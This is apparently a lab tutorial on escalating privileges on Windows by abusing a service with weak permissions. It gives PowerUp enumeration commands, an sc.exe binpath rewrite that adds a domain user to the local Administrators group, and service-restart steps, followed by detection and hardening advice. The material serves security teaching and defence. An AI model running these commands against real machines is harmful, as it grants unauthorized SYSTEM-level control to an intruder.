# 🛡️ Windows Local Privilege Escalation & Service Abuse 

## 🎯 1. Privilege Escalation Overview (MITRE ATT&CK [TA0004])

**Privilege Escalation** consists of techniques that adversaries use to gain higher-level permissions on a system (such as `NT AUTHORITY\SYSTEM` or local `Administrator`).

| Technique ID | Technique Name | Windows Context / Mechanism |
| :--- | :--- | :--- |
| **T1548** | Abuse Elevation Control Mechanism | Bypassing UAC via auto-elevating binaries or registry hijacking. |
| **T1134** | Access Token Manipulation | Impersonating or creating tokens (`SeImpersonatePrivilege`, `SeAssignPrimaryToken`). |
| **T1547** | Boot or Logon Autostart Execution | Hijacking registry run keys, startup folders, or Winlogon helpers. |
| **T1037** | Boot or Logon Initialization Scripts | Modifying logon scripts or group policy startup scripts. |
| **T1543.003**| Create or Modify System Process: Windows Service | Modifying existing service binaries, DACLs, or registry configurations. |
| **T1546** | Event Triggered Execution | Abusing WMI Event Subscriptions, Accessibility binaries (Sticky Keys), or Image File Execution Options (IFEO). |
| **T1068** | Exploitation for Privilege Escalation | Abusing OS kernel or driver vulnerabilities (e.g., CVEs). |
| **T1055** | Process Injection | Injecting shellcode/DLLs into elevated processes. |
| **T1053.005**| Scheduled Task/Job: Scheduled Task | Modifying or hijacking poorly configured scheduled tasks. |
| **T1078** | Valid Accounts | Leveraging leaked domain/local credentials with administrative membership. |

---

## ⚙️ 2. Windows Service Architecture & Abuse Mechanics

### The Concept
Windows Services are managed by the **Service Control Manager (SCM)** and typically run under high-privilege accounts, most notably **`NT AUTHORITY\SYSTEM`**.

### The Vulnerability: Insecure Service Permissions (Weak DACLs)
Every service has a **Discretionary Access Control List (DACL)**. If a low-privileged user or group (e.g., `Authenticated Users`, `Everyone`, `BUILTIN\Users`) has write/modify permissions (`SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`) on a service:
1. An attacker can rewrite the service's execution path (`binpath`).
2. Point the `binpath` to an arbitrary command or malicious binary.
3. Restart the service.
4. When SCM starts the service, the command runs in the security context of the service account (**`SYSTEM`**).

---

## 🔍 3. Automated Enumeration via PowerUp.ps1

**PowerUp** (part of the PowerSploit suite) automates checks for common local privilege escalation vectors on Windows.

```powershell
# Import PowerUp into the current session
. .\PowerUp.ps1

# Run all automated enumeration checks with detailed output
Invoke-AllChecks -Verbose

```

### Key PowerUp Functions

* **`Get-ModifiableService`**: Scans all services where the current user has permissions to modify the service configuration (e.g., `SERVICE_CHANGE_CONFIG`).
* **`Get-ServiceUnquoted`**: Checks for service paths containing spaces that are not enclosed in quotation marks (e.g., `C:\Program Files\My Service\service.exe`).
* **`Get-ModifiableServiceFile`**: Identifies services whose underlying `.exe` binary can be overwritten on disk.
* **`Get-ModifiableRegistryAutoRun`**: Checks for autorun registry keys that low-privilege users can modify.

---

## 🛠️ 4. Manual Verification & Group Reconnaissance

Before escalating, map out the current user context and target administrative groups.

```powershell
# 1. Check current identity and group memberships
whoami
whoami /groups

# 2. List all local groups on the target machine
net localgroup

# 3. Enumerate members of the local Administrators group
net localgroup administrators

```

> **Target Identification:** In an Active Directory environment, identify accounts that belong to the local `Administrators` group. A user format like `CYBERWARFARE\emp_svc` indicates a domain account (`CYBERWARFARE` domain, `emp_svc` user) with local admin rights.

---

## 🚀 5. Exploitation: Insecure Service `binpath` Manipulation

### Step 1: Query the Service Configuration

Use `sc.exe qc` (Query Configuration) to examine the current binary path, service start type, and the execution account:

```cmd
sc.exe qc snmptrap

```

*Example Output:*

```text
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: snmptrap
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\snmptrap.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : SNMP Trap
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

---

### Step 2: Modify the Binary Path (`binpath`)

Because weak DACLs allow configuration changes, overwrite the `binpath` to execute a privilege escalation payload (such as adding your low-privilege domain user to the local `Administrators` group):

```cmd
sc.exe config snmptrap binpath="net localgroup administrators CYBERWARFARE\employee /add"

```

*Verification:*

```cmd
sc.exe qc snmptrap

```

*`BINARY_PATH_NAME` now reflects the modified payload.*

---

### Step 3: Trigger the Execution

Restart the service to force the Service Control Manager to execute the modified `binpath` under the `LocalSystem` account:

```powershell
# Stop and restart via PowerShell
Restart-Service snmptrap -Verbose

# OR using sc.exe / net.exe
net stop snmptrap
net start snmptrap

# Now what will happen is when we will restart the snmptrap service it will look in the binary path for the executable to execute but instead it will execute the net localgroup command and unknowingly elevating our privileges to administrator user.
```

*(Note: The service may report an error/crash after starting because `net.exe` does not send the required service status handshake back to SCM. This is normal—the command will have already executed).*

---

### Step 4: Refresh Access Tokens

Windows access tokens are generated at logon. To apply the newly granted `Administrator` group rights, refresh the session:

```cmd
# Log off the current user session
logoff.exe

# Re-authenticate and verify membership
net localgroup administrators

```

---

## 🛡️ 6. Defensive Remediation & Detection

* **Service DACL Hardening:** Restrict service configuration modification rights (`SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`) exclusively to `BUILTIN\Administrators` and `NT AUTHORITY\SYSTEM`.
* **Access Control Auditing:** Use tools like `AccessChk` (Sysinternals) or Group Policy Objects (GPOs) to audit and enforce standard service permissions.
* **Process Creation Monitoring:** Monitor event logs (Sysmon Event ID 1 / Windows Security Event ID 4688) for execution of `sc.exe config` modifying `binpath` values.
* **Group Modification Auditing:** Monitor Windows Security Event ID `4728` (A member was added to a security-enabled global group) and Event ID `4732` (A member was added to a security-enabled local group).

